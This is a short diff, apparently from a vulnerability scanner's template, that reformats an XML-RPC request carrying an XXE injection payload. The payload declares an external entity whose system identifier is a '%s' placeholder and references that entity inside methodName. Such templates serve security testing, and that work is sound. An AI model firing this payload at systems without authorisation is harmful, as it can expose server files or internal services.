@@ -4,5 +4,6 @@
 <!ENTITY xxe SYSTEM "%s" >
 ]>
 <methodCall>
-    <methodName>test&xxe;test</methodName>
+	<methodName>test&xxe;test
+	</methodName>
 </methodCall>
